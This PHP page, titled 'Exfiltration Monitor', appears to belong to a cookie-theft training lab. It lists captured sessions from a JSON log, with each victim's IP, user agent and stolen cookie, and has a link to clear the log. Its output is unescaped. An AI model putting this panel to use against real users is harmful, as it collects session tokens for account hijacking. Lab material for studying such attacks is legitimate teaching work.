<?php
// captured.php - Live Capture Dashboard
$log_file = 'captured.json';

if (isset($_GET['action']) && $_GET['action'] == 'clear') {
    file_put_contents($log_file, json_encode([]));
    header("Location: captured.php");
    exit;
}

$data = [];
if (file_exists($log_file)) {
    $data = json_decode(file_get_contents($log_file), true) ?? [];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TERMINAL | Captured Sessions</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .terminal-box {
            font-family: 'Courier New', Courier, monospace;
            background: #000;
            color: var(--primary);
            padding: 2rem;
            border-radius: 8px;
            border: 1px solid var(--primary);
            min-height: 500px;
            overflow-y: auto;
            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
        }
        .log-entry {
            border-bottom: 1px solid rgba(0, 255, 157, 0.2);
            padding: 1rem 0;
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .captured-cookie {
            word-break: break-all;
            background: rgba(255, 0, 85, 0.1);
            color: var(--accent);
            padding: 0.5rem;
            border-radius: 4px;
            margin-top: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem;">
            <h1><i class="fas fa-terminal"></i> EXFILTRATION MONITOR</h1>
            <div>
                <a href="index.php" class="btn btn-outline" style="margin-right: 10px;">Back to Lab</a>
                <a href="?action=clear" class="btn btn-outline" style="color: var(--accent); border-color: var(--accent);">Clear Logs</a>
            </div>
        </div>

        <div class="terminal-box">
            <div style="color: var(--text-muted); margin-bottom: 1rem;">[ SYSTEM READY ] Waiting for incoming data...</div>

            <?php if (empty($data)): ?>
                <p style="text-align: center; margin-top: 4rem; color: var(--text-muted);">No sessions captured yet.</p>
            <?php else: ?>
                <?php foreach ($data as $entry): ?>
                    <div class="log-entry">
                        <div style="display: flex; justify-content: space-between;">
                            <span style="color: var(--secondary);">[Captured at <?= $entry['time'] ?>]</span>
                            <span>IP: <?= $entry['ip'] ?></span>
                        </div>
                        <div style="font-size: 0.8rem; margin: 0.5rem 0;">User-Agent: <?= $entry['ua'] ?></div>
                        <div class="captured-cookie">
                            <strong>COOKIE:</strong> <?= $entry['cookie'] ?>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
